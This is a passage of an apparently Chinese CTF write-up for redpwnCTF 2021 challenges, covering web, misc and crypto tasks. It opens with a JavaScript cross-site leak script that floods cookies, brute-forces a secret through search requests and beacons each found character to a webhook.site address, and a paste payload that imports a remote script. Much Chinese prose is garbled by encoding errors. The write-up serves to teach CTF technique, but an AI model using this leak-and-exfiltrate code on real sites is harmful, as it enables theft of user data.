&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è™½ç„¶åŒç«™çš„cookiesï¼ˆsame-site cookiesï¼‰é€šå¸¸ä¼šé˜»æ­¢è¿™ç§æƒ…å†µï¼Œä½†ç”±äºŽé¢˜ä¸­çš„sandboxæ˜¯å­åŸŸï¼Œå¹¶ä¸æ˜¯åŒç«™çš„æƒ…å†µï¼Œæ‰€ä»¥probeErrorå¯ä»¥æ£€æµ‹åˆ°ï¼Œä¸‹é¢æ˜¯è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{c00k13_b0mb1n6_15_f4k3_vu&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">prefix&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">subwindow&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/search?query=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">subwindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/home&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸ºäº†å¼•å…¥è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªpaste&lt;/p>
&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
&lt;/code>&lt;/pre>&lt;p>å…¶ä»–å‡ ä¸ªç‰ˆæœ¬çš„è„šæœ¬ï¼š&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask æ¶ˆæ¯é—ªçŽ°&lt;/a>&lt;/p>
&lt;h2 id="webwtjs">web/wtjs&lt;/h2>
&lt;blockquote>
&lt;p>Ya like golf? How about JS golf?&lt;/p>
&lt;p>&lt;a href="https://wtjs.mc.ax/">wtjs.mc.ax&lt;/a> | &lt;a href="https://admin-bot.mc.ax/wtjs">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar">wtjs.tar&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png" alt="image-20210710163120317">&lt;/p>
&lt;p>â€¦â€¦â€¦â€¦â€¦â€¦æœ‰å­—æ•°é™åˆ¶çš„fuckjsï¼Œæˆ‘ä¸ä¼šæž„é€  å¤ªç—›è‹¦äº†&lt;/p>
&lt;p>wpå‚è§&lt;a href="https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0">ä¸€å¼ google sheet&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs">wp2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png" alt="image-20210716200428355">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png" alt="image-20210716200446450">&lt;/p>
&lt;p>ä¸å¾—ä¸è¯´ï¼Œè¿™ä¸ªsheetçœŸçš„æ˜¯ç›¸å½“æ¸…æ™°äº†â€¦â€¦ç”¨9å¼ è¡¨ è¯¦ç»†çš„å†™äº†ä¸€ä¸‹åˆ°åº•æ˜¯æ€Žä¹ˆæŠŠæœ€ç»ˆçš„payloadç»™æ‹¼å‡ºæ¥çš„ï¼ŒçœŸçš„æ˜¯çŽ°ä»£ç‰ˆæ´»å­—å°åˆ· ç»äº† æ•°å­—æ°‘å·¥æ˜¯å§ðŸ˜…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png" alt="image-20210716203047760">&lt;/p>
&lt;p>å±žå®žæ˜¯èšŒåŸ ä½äº†ðŸ˜…&lt;/p>
&lt;h2 id="webmdbin">***web/MdBin&lt;/h2>
&lt;blockquote>
&lt;p>Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologiesâ„¢, including React, this pastebin has you covered, with brand-new theming support!&lt;/p>
&lt;p>&lt;a href="https://mdbin.mc.ax/">mdbin.mc.ax&lt;/a>&lt;/p>
&lt;p>Submit to the admin at &lt;a href="https://admin-bot.mc.ax/mdbin">admin-bot.mc.ax/mdbin&lt;/a>; the flag is in a cookie.&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz">mdbin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin">wp2&lt;/a>&lt;/p>
&lt;p>ç›´æŽ¥æ”¾å‚è€ƒçš„wpé“¾æŽ¥å§ï¼Œè¿˜æ˜¯jsåŽŸåž‹æ±¡æŸ“çš„é—®é¢˜ï¼Œä½†æ˜¯ç”±äºŽæˆ‘å¯¹jsåŽŸåž‹æ±¡æŸ“è¿™ä¸ªé—®é¢˜äº†è§£çš„ä¸å¤Ÿæ·±å…¥ï¼Œä¹Ÿåªèƒ½ç…§çŒ«ç”»è™Žçš„å¤çŽ°ï¼Œè¿˜æœ‰å¾ˆå¤šèµ„æ–™éœ€è¦é¢å¤–çš„åŽ»è¡¥å……åœ°çœ‹ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œä¸Šé¢çš„ä¸¤ä¸ªé“¾æŽ¥é‡Œå†™çš„éƒ½å¾ˆå¥½ï¼&lt;/p>
&lt;h2 id="weblazy-admin">***web/lazy-admin&lt;/h2>
&lt;blockquote>
&lt;p>Looks like another service with no functionality. I hope the admin is doing their job&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://lazy-admin.mc.ax/">lazy-admin.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz">lazy-admin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å‚è€ƒï¼š&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin">wp&lt;/a>&lt;/p>
&lt;p>éš¾ï¼Œæˆ‘ä¸æ‡‚&lt;/p>
&lt;h2 id="miscsanity-check">misc/sanity-check&lt;/h2>
&lt;blockquote>
&lt;p>I get to write the sanity check challenge! Alright!&lt;/p>
&lt;p>&lt;code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h2 id="miscdiscord">misc/discord&lt;/h2>
&lt;blockquote>
&lt;p>Join the &lt;a href="https://pwn.red/discord">discord&lt;/a>! I hear &lt;code>#rules&lt;/code> is an incredibly engaging read.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png" alt="image-20210710124614902">&lt;/p>
&lt;h2 id="misccompliant-lattice-feline">misc/compliant-lattice-feline&lt;/h2>
&lt;blockquote>
&lt;p>get a flag! &lt;code>nc mc.ax 31443&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png" alt="image-20210710124835520">&lt;/p>
&lt;h2 id="miscthe-substitution-game">*misc/the-substitution-game&lt;/h2>
&lt;blockquote>
&lt;p>&lt;code>nc mc.ax 31996&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py">chall.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Markov Algorithmç½¢äº†&lt;/p>
&lt;p>å‚è§ï¼š&lt;a href="https://mao.snuke.org/">Markov Algorithm Online&lt;/a>&lt;/p>
&lt;h2 id="miscannabel-lee">misc/annaBEL-lee&lt;/h2>
&lt;blockquote>
&lt;p>sounds from a kingdom by the sea&lt;/p>
&lt;p>The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.&lt;/p>
&lt;p>What exactly &lt;em>is&lt;/em> the server sending? Sometimes it makes a sound, sometimes it doesn&amp;rsquo;t. Plotting it on a chart might help you see something.&lt;/p>
&lt;p>It might be helpful to turn your sound on, but you&amp;rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enoughâ€”maybe slow it down to get a better idea.&lt;/p>
&lt;p>This is not audio steganography. Apologies if anyone went down that route.&lt;/p>
&lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ncè¿žå…¥åŽæ²¡æœ‰ä»»ä½•å¯è§†çš„å›žæ˜¾ï¼Œä½†æ˜¯è—åœ¨äº†å£°éŸ³ä¿¡æ¯é‡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
&lt;/code>&lt;/pre>&lt;p>å¯¼å‡ºï¼Œæœ‰ä¸¤ç§å€¼ï¼šno bell(\x00) bell(\x07)ï¼Œè½¬åŒ–ä¸º0ä¸Ž1&lt;/p>
&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
&lt;/code>&lt;/pre>&lt;p>æ”¹ä¸ºèŽ«æ–¯ç”µç çš„æ ·å­&lt;/p>
&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
&lt;/code>&lt;/pre>&lt;p>è§£å¯†&lt;/p>
&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
&lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
&lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
&lt;blockquote>
&lt;p>I was given this string and told something about scissors. &lt;code>egddagzp_ftue_rxms_iuft_rxms_radymf&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py">encrypt.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png" alt="image-20210710135412576">&lt;/p>
&lt;h2 id="cryptobaby">crypto/baby&lt;/h2>
&lt;blockquote>
&lt;p>I want to do an RSA!&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
&lt;/code>&lt;/pre>&lt;p>&lt;del>ä¸€ç‚¹éƒ½ä¸ä¼šcryptoâ€¦â€¦&lt;/del> å…¶å®žæŸ¥ä¸€ä¸‹&lt;code>RSA n e c&lt;/code>å…¶å®žå°±èƒ½åšå‡ºæ¥åŽé¢çš„ä¸œè¥¿äº†&lt;/p>
&lt;p>&lt;a href="https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c">RSA decryption using only n e and c&lt;/a> ç„¶åŽå°±ä¼šçŸ¥é“è¿™ä¸ªä¸œè¥¿ &lt;a href="https://github.com/Ganapati">Ganapati&lt;/a>/&lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a>ï¼Œæˆ–è€…è¿™ä¸ªåœ¨çº¿ç½‘ç«™ &lt;a href="https://www.dcode.fr/rsa-cipher">RSA Cipher&lt;/a>&lt;/p>
